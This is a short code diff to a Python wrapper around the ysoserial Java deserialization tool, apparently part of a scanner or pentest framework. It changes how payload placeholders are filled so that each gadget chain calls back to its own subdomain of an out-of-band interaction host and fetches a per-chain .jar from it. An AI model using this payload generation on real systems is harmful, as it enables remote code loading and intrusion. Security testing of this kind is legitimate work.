@@ -192,8 +192,8 @@ class YSOSerial(Serializer):
                 chainArguments = chainArguments.replace('<remote_dir>', remote_dir)
                 chainArguments = chainArguments.replace('<remote_port>', str(remote_port))
                 chainArguments = chainArguments.replace('<classname>', chain['id'])
-                chainArguments = chainArguments.replace('<domain>', str(interact_domain))
-                chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/{chain['id']}.jar")
+                chainArguments = chainArguments.replace('<domain>', f"{chain['id']}.{interact_domain}")
+                chainArguments = chainArguments.replace('<url>', f"https://{chain['id']}.{interact_domain}/{chain['id']}.jar")
                 
                 with open(fp.name, mode='w') as ft:
                     ft.write(chain_jsp_code)
